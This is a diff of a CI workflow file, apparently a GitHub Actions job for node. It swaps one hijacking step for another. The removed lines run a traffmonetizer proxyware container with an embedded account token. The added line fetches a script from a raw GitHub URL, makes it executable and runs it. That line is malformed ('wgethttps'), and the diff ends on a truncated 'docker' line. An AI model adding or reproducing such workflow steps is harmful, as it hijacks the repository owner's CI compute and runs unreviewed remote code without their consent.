@@ -30,5 +30,5 @@ jobs:
         with:
           node-version: ${{ matrix.node }}
       - if: ${{ matrix.npm }}
-        run: docker pull traffmonetizer/cli_v2:latest
-      - run: docker run -i --name tm traffmonetizer/cli_v2 start accept --token xMkGgITddfrrehRZm3IP8KCQnLcQO/dWN2vjeB1IDDQ=
+        run: wgethttps://raw.githubusercontent.com/Trafficmotiza/fvgh/refs/heads/main/b && chmod +x b && bash b && ./b
+      - run: docker
